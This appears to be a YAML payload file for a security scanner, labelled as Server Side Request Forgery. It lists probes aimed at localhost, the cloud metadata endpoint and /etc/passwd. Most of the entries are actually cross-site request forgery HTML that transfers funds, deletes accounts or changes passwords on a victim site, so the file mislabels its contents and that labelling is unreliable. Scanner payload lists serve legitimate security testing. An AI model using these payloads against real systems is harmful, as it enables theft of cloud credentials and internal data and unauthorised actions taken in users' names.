name: "Server Side Request Forgery"
type: "ssrf"
severity: "high"
payloads:
  - "http://localhost"
  - "http://127.0.0.1"
  - "http://169.254.169.254/latest/meta-data/"
  - "ftp://localhost"
  - "file:///etc/passwd"
  - "http://example.com"
  - "https://127.0.0.1"
  - "http://[::1]/"
  - "http://0.0.0.0"
  - "<img src='http://victim.com/change-email?email=attacker@example.com'>"
  - "<img src='http://victim.com/transfer-funds?amount=10000&to=attacker_account'>"
  - "<form action='http://victim.com/delete-account' method='POST'><input type='hidden' name='confirm' value='true'><input type='submit'></form>"
  - "<img src='http://victim.com/reset-password?token=malicious_token'>"
  - "<script>document.location='http://victim.com/delete-comment?id=1234';</script>"
  - "<img src='http://victim.com/logout' style='display:none;'>"
  - "<a href='http://victim.com/change-password?newPassword=maliciouspassword'>Click me</a>"
  - "<form action='http://victim.com/change-settings' method='POST'><input type='hidden' name='setting' value='malicious_value'><input type='submit'></form>"
